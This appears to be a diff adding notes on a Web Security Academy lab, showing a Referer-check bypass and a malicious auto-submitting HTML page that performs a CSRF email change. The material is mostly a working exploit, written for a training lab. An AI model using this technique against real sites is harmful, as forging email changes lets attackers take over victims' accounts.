@@ -1,0 +1,19 @@
+// The following referer worked:
+Referer: https://kiddie.com?url=aca51f2e1f1ee8d280c426a800ee00f5.web-security-academy.net/
+
+// Edit the URL of the malicious HTML page on our server
+/exploit/aca51f2e1f1ee8d280c426a800ee00f5.web-security-academy.net/
+
+// Create the malicious HTML
+<html>
+<body>
+<script>history.pushState('','','/?aca51f2e1f1ee8d280c426a800ee00f5.web-security-academy.net/')</script>
+<form action="https://aca51f2e1f1ee8d280c426a800ee00f5.web-security-academy.net/email/change-email" method="POST">
+<input type="hidden" name="email" value="kiddie&#64;test&#46;com">
+<input type="submit" value="Submit request">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>                   
+</html>
